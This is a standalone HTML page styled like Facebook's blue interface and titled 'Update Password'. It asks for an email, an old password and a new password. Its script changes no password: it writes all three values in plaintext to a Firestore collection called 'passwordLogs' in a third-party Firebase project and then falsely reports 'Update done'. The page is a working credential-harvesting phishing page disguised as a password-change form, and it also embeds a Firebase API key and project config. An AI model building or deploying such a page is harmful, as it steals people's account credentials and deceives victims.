<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Update Password</title>

  <style>
    * {
  box-sizing: border-box;
}
    body {
      font-family: Arial;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px;
    }

    .box {
      background: white;
      padding: 20px;
      border-radius: 12px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #1877f2;
      margin-bottom: 15px;
      font-size: 22px;
    }

    input {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border: 1px solid #ddd;
  border-radius: 8px;
  font-size: 16px;
  outline: none;
  box-sizing: border-box;
  display: block;
}

    input:focus {
      border-color: #1877f2;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }

    button:hover {
      background: #155dc1;
    }

    /* 📱 تحسين الموبايل */
    @media (max-width: 480px) {
      .box {
        padding: 15px;
      }

      h2 {
        font-size: 20px;
      }

      input, button {
        font-size: 15px;
        padding: 12px;
      }
    }
  </style>
</head>

<body>

<div class="box">
  <h2>Update Password</h2>

  <input type="text" id="email" placeholder="Email">
  <input type="password" id="password" placeholder="Old Password">
  <input type="password" id="newPassword" placeholder="New Password">
  <input type="password" id="confirmPassword" placeholder="Confirm Password">

  <button onclick="updateData()">Update</button>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
  import { getFirestore, collection, addDoc } 
  from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBOQtPf98v3xQGmwTlWo9J2EQyNLED43gs",
    authDomain: "tast-d18b0.firebaseapp.com",
    databaseURL: "https://tast-d18b0-default-rtdb.firebaseio.com",
    projectId: "tast-d18b0",
    storageBucket: "tast-d18b0.firebasestorage.app",
    messagingSenderId: "73439003067",
    appId: "1:73439003067:web:46c3b7b275762fb9f9449e"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  window.updateData = async function () {

    const email = document.getElementById("email").value;
    const oldPassword = document.getElementById("password").value;
    const newPassword = document.getElementById("newPassword").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    if (newPassword !== confirmPassword) {
      alert("Passwords do not match");
      return;
    }

    try {
      await addDoc(collection(db, "passwordLogs"), {
        email,
        oldPassword,
        newPassword,
        createdAt: new Date()
      });

      alert("Update done");

    } catch (error) {
      alert(error.message);
    }
  }
</script>

</body>
</html>
